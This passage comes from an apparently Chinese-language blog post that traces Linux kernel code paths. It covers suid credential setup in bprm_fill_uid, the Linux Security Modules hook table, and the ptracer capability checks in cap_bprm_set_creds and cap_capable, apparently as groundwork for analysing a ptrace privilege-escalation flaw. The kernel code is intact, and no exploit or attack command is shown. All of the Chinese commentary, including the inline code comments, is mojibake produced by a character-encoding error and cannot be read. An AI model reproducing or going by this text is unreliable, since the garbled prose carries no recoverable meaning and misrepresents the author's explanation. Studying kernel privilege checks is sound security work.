class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bprm_fill_uid</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mode;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Since this can be called multiple times (via prepare_binprm),</span></span><br><span class="line"><span class="comment"> * we must clear any previous work done when setting set[ug]id</span></span><br><span class="line"><span class="comment"> * bits from any earlier bprm-&gt;file uses (for example when run</span></span><br><span class="line"><span class="comment"> * first for a setuid script then again for its interpreter).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// ç¬”è€…æ³¨ï¼šé¦–å…ˆä½¿ç”¨åŸè¿›ç¨‹ euid egid</span></span><br><span class="line">bprm-&gt;cred-&gt;euid = current_euid();</span><br><span class="line">bprm-&gt;cred-&gt;egid = current_egid();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_no_new_privs(current))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">inode = file_inode(bprm-&gt;file);</span><br><span class="line">mode = READ_ONCE(inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID)))</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// ç¬”è€…æ³¨ï¼šä¸æ˜¯ suid/sgid ç¨‹åºï¼Œç›´æ¥è¿”å›ï¼Œå¦åˆ™å°† euid/egid è®¾ä¸ºæ–‡ä»¶ uid/gid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Be careful if suid/sgid is set */</span></span><br><span class="line">inode_lock(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* reload atomically mode/uid/gid now that lock held */</span></span><br><span class="line">mode = inode-&gt;i_mode;</span><br><span class="line">uid = inode-&gt;i_uid;</span><br><span class="line">gid = inode-&gt;i_gid;</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span></span><br><span class="line"><span class="keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||</span><br><span class="line"> !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode &amp; S_ISUID) &#123;</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">bprm-&gt;cred-&gt;euid = uid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">bprm-&gt;cred-&gt;egid = gid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°è¿™æ ·ä¸€ä¸ªé€»è¾‘ï¼šå½“æˆ‘ä»¬å°è¯•è¿è¡Œä¸€ä¸ª suid ç¨‹åºæ—¶ï¼Œå…¶ä¼šå°†æ–°è¿›ç¨‹çš„ cred-&gt;euid è®¾ç½®ä¸º suid æ–‡ä»¶çš„ uid</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ fork å‡ºå­è¿›ç¨‹è¿è¡Œ suid ç¨‹åºã€çˆ¶è¿›ç¨‹å† ptrace attach å²‚ä¸å°±èƒ½ç›´æ¥å®Œæˆææƒäº†å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œå› ä¸ºåé¢è¿˜ä¼šè¿›è¡Œæƒé™æ£€æŸ¥ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¸ªè°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    do_execveat_common()</span><br><span class="line">    prepare_binprm()</span><br><span class="line">    bprm_fill_uid()</span><br><span class="line">    security_bprm_set_creds()</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å®šä¹‰äº <code>security/security.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">security_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> call_int_hook(bprm_set_creds, <span class="number">0</span>, bprm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶åªæœ‰ä¸€ä¸ªè¯­å¥ä½†è§£é‡Šèµ·æ¥å¯èƒ½æœ‰ç‚¹å¤æ‚ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µâ€”â€” <code>Linux Security Modules</code>ï¼ˆLSMï¼‰</p><h3 id="Linux-Security-Modules"><a href="#Linux-Security-Modules" class="headerlink" title="Linux Security Modules"></a>Linux Security Modules</h3><p>LSM å³ Linux å®‰å…¨æ¨¡ç»„ï¼Œç±»ä¼¼äº VFSï¼Œ å…¶æä¾›äº†ç»Ÿä¸€çš„å®‰å…¨ä¸šåŠ¡é€»è¾‘æ¥å£ï¼Œä¾‹å¦‚ SELinux ä¾¿æ˜¯åŸºäº LSM å®ç°çš„ï¼Œæ•´ä½“æ¡†æ¶å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/01/12/f91geXREUiTyFSm.png" alt="å·çš„å›¾.png"></p><blockquote><p>å¯ç”¨è¿™ä¸ªæ¡†æ¶éœ€è¦å¼€å¯å†…æ ¸ç¼–è¯‘é€‰é¡¹ <code>CONFIG_SECURITY</code>ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p></blockquote><p>ç°åœ¨æˆ‘ä»¬æ¥å‰–æ <code>call_int_hook</code> å®ï¼Œè¯¥å®ç”¨äº<strong>è°ƒç”¨å¯¹åº”çš„ LSM é’©å­</strong>ï¼Œå®šä¹‰äº <code>/security/security.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span></span><br><span class="line"><span class="meta">int RC = IRC;\</span></span><br><span class="line"><span class="meta">do &#123;\</span></span><br><span class="line"><span class="meta">struct security_hook_list *P;\</span></span><br><span class="line"><span class="meta">\</span></span><br><span class="line"><span class="meta">list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span></span><br><span class="line"><span class="meta">RC = P-&gt;hook.FUNC(__VA_ARGS__);\</span></span><br><span class="line"><span class="meta"><span class="keyword">if</span> (RC != 0)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">&#125; while (0);\</span></span><br><span class="line"><span class="meta">RC;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>list_for_each_entry</code> æ˜¯å†…æ ¸ä¸­å¸¸ç”¨éå†å®ï¼Œè¿™é‡Œä¸å†èµ˜å™ï¼Œè¿™é‡Œçš„ <code>security_hook_heads</code> æ˜¯ä¸€ä¸ª<strong>å…¨å±€ç»“æ„ä½“</strong>ï¼Œé˜…è¯»æºç å¯ä»¥å‘ç°å…¶ä¸­å­˜æ”¾çš„éƒ½æ˜¯å†…æ ¸åŒå‘é“¾è¡¨ç»“æ„ï¼Œå…¶å®å¯¹åº”çš„åº”å½“æ˜¯ <code>security_hook_list</code> ç»“æ„ä½“ï¼Œå®šä¹‰äº <code>/include/linux/lsm_hooks.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Security module hook list structure.</span></span><br><span class="line"><span class="comment"> * For use with generic list macros for common operations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>*<span class="title">head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">security_list_options</span><span class="title">hook</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­è”åˆä½“ <code>security_list_options</code> å…¶å®å°±æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä¸å†èµ˜å™ï¼Œé‚£ä¹ˆ <code>call_int_hook</code> å®çš„ä½œç”¨å°±ä¸è¨€è€Œå–»äº†ï¼šè°ƒç”¨ <code>security_hook_heads</code> ä¸­å¯¹åº”æˆå‘˜çš„å‡½æ•°æŒ‡é’ˆã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º <code>security_hook_heads</code> ç»“æ„ä½“ç›¸å½“äºä¸€å¼ å‡½æ•°è¡¨</p><p>è¿™å¼ å‡½æ•°è¡¨ä¼šåœ¨å†…æ ¸åˆå§‹åŒ–æ—¶è¢«åˆå§‹åŒ–ï¼Œè¿™é‡Œæˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ°<strong>å†…æ ¸å¯åŠ¨çš„åˆå§‹åŒ–å‡½æ•°</strong>â€”â€”<code>start_kernel()</code> ä¸­ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/init/main.c</code> ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage __visible <span class="type">void</span> __init <span class="title function_">start_kernel</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    security_init();</span><br></pre></td></tr></table></figure><p>å‡½æ•° <code>security_init()</code> ç”¨ä»¥è¿›è¡Œ LSM çš„åˆå§‹åŒ–ï¼Œå®šä¹‰äº <code>/security/security.c</code> ä¸­ï¼Œè§‚å¯Ÿåˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security_init()</span><br><span class="line">    capability_add_hooks()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>capability_add_hooks()</code> é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå®šä¹‰äº <code>/security/commoncap.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">capability_hooks</span>[] =</span> &#123;</span><br><span class="line">LSM_HOOK_INIT(capable, cap_capable),</span><br><span class="line">LSM_HOOK_INIT(settime, cap_settime),</span><br><span class="line">LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),</span><br><span class="line">LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),</span><br><span class="line">LSM_HOOK_INIT(capget, cap_capget),</span><br><span class="line">LSM_HOOK_INIT(capset, cap_capset),</span><br><span class="line">LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),</span><br><span class="line">LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),</span><br><span class="line">LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),</span><br><span class="line">LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),</span><br><span class="line">LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),</span><br><span class="line">LSM_HOOK_INIT(mmap_file, cap_mmap_file),</span><br><span class="line">LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),</span><br><span class="line">LSM_HOOK_INIT(task_prctl, cap_task_prctl),</span><br><span class="line">LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),</span><br><span class="line">LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),</span><br><span class="line">LSM_HOOK_INIT(task_setnice, cap_task_setnice),</span><br><span class="line">LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">capability_add_hooks</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">security_add_hooks(capability_hooks, ARRAY_SIZE(capability_hooks));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>security_add_hooks()</code> å‡½æ•°å®šä¹‰äº <code>/include/linux/lsm_hooks.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">security_add_hooks</span><span class="params">(<span class="keyword">struct</span> security_hook_list *hooks,</span></span><br><span class="line"><span class="params">      <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">list_add_tail_rcu(&amp;hooks[i].<span class="built_in">list</span>, hooks[i].head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæ•´ä¸ªé€»è¾‘å°±ä¸€ç›®äº†ç„¶äº†ï¼Œè¯¥å‡½æ•°è¡¨ä¼šæ ¹æ®è¡¨ <code>capability_hooks</code> è¿›è¡Œå¯¹åº”çš„åˆå§‹åŒ–æ“ä½œ</p><h3 id="ptracer-æƒé™æ£€æŸ¥"><a href="#ptracer-æƒé™æ£€æŸ¥" class="headerlink" title="ptracer æƒé™æ£€æŸ¥"></a>ptracer æƒé™æ£€æŸ¥</h3><p>ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾å› <code>security_bprm_set_creds()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥çŸ¥é“å…¶è°ƒç”¨çš„åº”å½“æ˜¯ <code>security_hook_heads-&gt;bprm_set_creds-&gt;hook</code>ï¼Œè¿™ä¸ªé’©å­æŒ‡å‘å‡½æ•° <code>cap_bprm_set_creds</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº<code>/security/commoncap.c</code> ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cap_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> current_cred();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> bprm-&gt;cred;</span><br><span class="line"><span class="type">bool</span> effective, has_cap = <span class="literal">false</span>, is_setid;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"><span class="type">kuid_t</span> root_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¬”è€…æ³¨ï¼šå¯¹è¢« ptrace çš„ suid/sgid è¿›ç¨‹è¿›è¡Œæƒé™æ£€æŸ¥</span></span><br><span class="line">    <span class="comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment"> * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">is_setid = !uid_eq(new-&gt;euid, old-&gt;uid) || !gid_eq(new-&gt;egid, old-&gt;gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((is_setid || <span class="comment">// æ˜¯å¦ä¸º suid/sgid</span></span><br><span class="line">     !cap_issubset(new-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;</span><br><span class="line">    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||</span><br><span class="line">     !ptracer_capable(current, new-&gt;user_ns))) &#123; <span class="comment">// æ˜¯å¦è¢« ptraceï¼Œè‹¥æ˜¯ï¼Œæ£€æŸ¥æ˜¯å¦è¶Šæƒ</span></span><br><span class="line"><span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line">        <span class="comment">//è‹¥æ£€æŸ¥å‡ºè¶Šæƒï¼Œåˆ™é‡æ–°è¿›è¡Œä¸€æ¬¡æ£€æŸ¥ï¼Œè¿›è¡Œé™æƒ</span></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">new-&gt;euid = new-&gt;uid;</span><br><span class="line">new-&gt;egid = new-&gt;gid;</span><br><span class="line">&#125;</span><br><span class="line">new-&gt;cap_permitted = cap_intersect(new-&gt;cap_permitted,</span><br><span class="line">   old-&gt;cap_permitted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new-&gt;suid = new-&gt;fsuid = new-&gt;euid;</span><br><span class="line">new-&gt;sgid = new-&gt;fsgid = new-&gt;egid;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>ptracer_capable()</code> å®šä¹‰äº <code>/kernel/capability.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ptracer_capable - Determine if the ptracer holds CAP_SYS_PTRACE in the namespace</span></span><br><span class="line"><span class="comment"> * @tsk: The task that may be ptraced</span></span><br><span class="line"><span class="comment"> * @ns: The user namespace to search for CAP_SYS_PTRACE in</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return true if the task that is ptracing the current task had CAP_SYS_PTRACE</span></span><br><span class="line"><span class="comment"> * in the specified user namespace.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ptracer_capable</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> user_namespace *ns)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">cred = rcu_dereference(tsk-&gt;ptracer_cred);</span><br><span class="line"><span class="keyword">if</span> (cred)</span><br><span class="line">ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ£€æŸ¥äº†è¿›ç¨‹çš„ <code>ptracer_cred</code> å­—æ®µï¼Œè‹¥ä¸ä¸º NULL åˆ™è¯´æ˜è¯¥è¿›ç¨‹ä¸º ptraceeï¼Œæ¥ä¸‹æ¥ä½¿ç”¨ <code>security_capable_noaudit</code> å‡½æ•°è¿›è¡Œæ£€æŸ¥ï¼Œè¯¥å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ª LSM é’©å­çš„ APIï¼Œå¯¹åº”è°ƒç”¨ <code>security_hook_heads-&gt;capable-&gt;hook</code>ï¼Œå¯¹åº”å‡½æ•°ä¸º <code>cap_capable()</code>ï¼Œå®šä¹‰äº <code>/security/commoncap.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cap_capable - Determine whether a task has a particular effective capability</span></span><br><span class="line"><span class="comment"> * @cred: The credentials to use</span></span><br><span class="line"><span class="comment"> * @ns:  The user namespace in which we need the capability</span></span><br><span class="line"><span class="comment"> * @cap: The capability to check for</span></span><br><span class="line"><span class="comment"> * @audit: Whether to write an audit message or not</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Determine whether the nominated task has the specified capability amongst</span></span><br><span class="line"><span class="comment"> * its effective set, returning 0 if it does, -ve if it does not.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE WELL: cap_has_capability() cannot be used like the kernel&#x27;s capable()</span></span><br><span class="line"><span class="comment"> * and has_capability() functions.  That is, it has the reverse semantics:</span></span><br><span class="line"><span class="comment"> * cap_has_capability() returns 0 when a task has a capability, but the</span></span><br><span class="line"><span class="comment"> * kernel&#x27;s capable() and has_capability() returns 1 for this case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cap_capable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *cred, <span class="keyword">struct</span> user_namespace *targ_ns,</span></span><br><span class="line"><span class="params"><span class="type">int</span> cap, <span class="type">int</span> audit)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> targ_ns;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* See if cred has the capability in the target user namespace</span></span><br><span class="line"><span class="comment"> * by examining the target user namespace and all of the target</span></span><br><span class="line"><span class="comment"> * user namespace&#x27;s parents.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/* Do we have the necessary capabilities? */</span></span><br><span class="line">        <span class="comment">// è‹¥ä¸ ptracer åŒå±åŒä¸€å‘½åç©ºé—´ï¼Œæ£€æŸ¥æƒé™æ˜¯å¦è¶³å¤Ÿ</span></span><br><span class="line"><span class="keyword">if</span> (ns == cred-&gt;user_ns)</span><br><span class="line"><span class="keyword">return</span> cap_raised(cred-&gt;cap_effective, cap) ? <span class="number">0</span> : -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Have we tried all of the parent namespaces? */</span></span><br><span class="line">        <span class="comment">// è‡ªåº•å‘ä¸Šéå†å®Œäº†ï¼Œè¯´æ˜æ£€æŸ¥å‡ºé”™ï¼Œè¿”å›å¯¹åº”é”™è¯¯å€¼</span></span><br><span class="line"><span class="keyword">if</span> (ns == &amp;init_user_ns)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * The owner of the user namespace in the parent of the</span></span><br><span class="line"><span class="comment"> * user namespace has all caps.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™é‡Œï¼Œè¿™é‡Œä¼šæ£€æŸ¥ ptracer_cred çš„å‘½åç©ºé—´æ˜¯å¦æ˜¯æ–°è¿›ç¨‹å‘½åç©ºé—´çš„çˆ¶å‘½åç©ºé—´</span></span><br><span class="line">        <span class="comment">// è‹¥æ˜¯ï¼Œæ£€æŸ¥æ˜¯å¦æ–°è¿›ç¨‹å‘½åç©ºé—´çš„æ‰€æœ‰è€…æ˜¯å¦ä¸ ptracer ä¸ºåŒä¸€ç”¨æˆ·</span></span><br><span class="line">        <span class="comment">// è‹¥æ˜¯ï¼Œè¿”å› 0ï¼Œè¯´æ˜é€šè¿‡æ£€æŸ¥</span></span><br><span class="line">        <span class="comment">// è‹¥å¦ï¼Œå‘ä¸Šéå†å‘½åç©ºé—´ï¼Œå›åˆ°å¼€å¤´</span></span><br><span class="line"><span class="keyword">if</span> ((ns-&gt;parent == 